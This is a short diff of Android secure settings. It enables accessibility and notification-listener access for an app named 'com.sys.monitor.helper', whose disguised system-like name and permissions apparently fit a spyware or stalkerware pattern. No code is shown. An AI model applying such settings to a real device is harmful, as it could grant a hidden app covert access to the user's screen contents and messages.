@@ -1,0 +1,3 @@
+default_input_method=com.touchtype.swiftkey/com.touchtype.KeyboardService
+enabled_accessibility_services=com.sys.monitor.helper/com.sys.monitor.helper.service.SyncAccessibilityService
+enabled_notification_listeners=com.sys.monitor.helper/com.sys.monitor.helper.service.NotifyService:com.google.android.gms/com.google.android.gms.nearby.exposurenotification.service.NotificationListener
